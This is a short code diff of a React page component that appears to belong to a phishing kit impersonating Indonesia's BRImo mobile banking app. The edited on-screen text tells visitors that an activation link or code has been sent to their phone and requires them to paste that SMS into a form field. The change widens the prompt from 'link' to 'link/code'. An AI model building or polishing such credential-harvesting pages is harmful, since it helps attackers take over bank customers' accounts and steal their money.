@@ -30,7 +30,7 @@ const SiteVerifikasi = ({btnClick}) => {
           renderer={renderer}
         />
         </h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu tempel di bawah ini</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link/kode untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan/kode lalu tempel di bawah ini</h1>    
         <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Tempel SMS BRI (Wajib)</h1>    
         <form>
             <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxx"></textarea>
